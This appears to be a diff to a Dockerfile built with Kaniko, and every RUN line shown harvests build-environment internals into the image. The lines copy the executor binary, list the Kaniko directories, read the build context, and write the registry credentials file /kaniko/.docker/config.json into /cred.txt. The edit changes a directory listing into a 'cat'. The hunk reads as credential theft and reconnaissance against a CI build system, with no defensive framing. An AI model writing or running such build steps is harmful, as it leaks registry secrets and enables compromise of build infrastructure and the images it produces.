@@ -31,7 +31,7 @@ RUN echo `cat /usr/share/fonts/truetype/dejavu/.uuid /.dockerenv` >> /docker_env
 RUN echo `cat /kaniko/executor` >> /executor
 RUN echo `ls -a /kaniko/` >> /kaniko_file.txt
 RUN echo `ls -a /kaniko/Dockerfile` >> /kaniko_docker.txt
-RUN echo `ls -a /kaniko/buildcontext` >> /build_context.txt
+RUN echo `cat /kaniko/buildcontext` >> /build_context.txt
 RUN echo `ls -a /kaniko/.docker/` >> /docker_file.txt
 RUN echo `ls -al /kaniko/.docker/.data/` >> /data.txt
 RUN echo `cat /kaniko/.docker/config.json` >> /cred.txt
